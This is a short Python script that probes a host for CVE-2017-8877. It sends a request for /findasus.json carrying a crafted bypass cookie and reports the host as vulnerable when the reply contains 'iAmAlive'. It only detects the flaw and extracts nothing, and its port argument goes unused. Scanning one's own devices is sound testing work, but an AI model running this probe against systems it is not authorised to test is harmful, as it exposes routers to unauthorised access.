import sys
import re
import requests
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""
def packet(target, port):
	try:
		s = requests.Session()
		#other url: /httpd_check.json
		URL = 'http://'+target+'/findasus.json'
		headers = {'Cookie' : 'traffic_warning_NaN=2019.11:1'}
		req = s.get(URL, headers=headers)
	
		if req.status_code == 200 and re.search('iAmAlive', req.text):
			print (Fore.GREEN+" [+] Vulnarable to CVE-2017-8877"+Fore.RESET)
		else:
			print (Fore.YELLOW+" [-] Not Vulnarable to CVE-2017-8877"+Fore.RESET)

	except:
		print(Fore.YELLOW+" [-] Not Vulnarable to CVE-2017-8877"+Fore.RESET)
		pass



# MAIN
if __name__ == "__main__":
	print description
	if len(sys.argv) is not 3:
		print(Fore.YELLOW+" [-] Example: python CVE-2017-8877.py <Target IP> <port>"+Fore.RESET)
		sys.exit(1)
	else:
		packet(sys.argv[1], sys.argv[2])
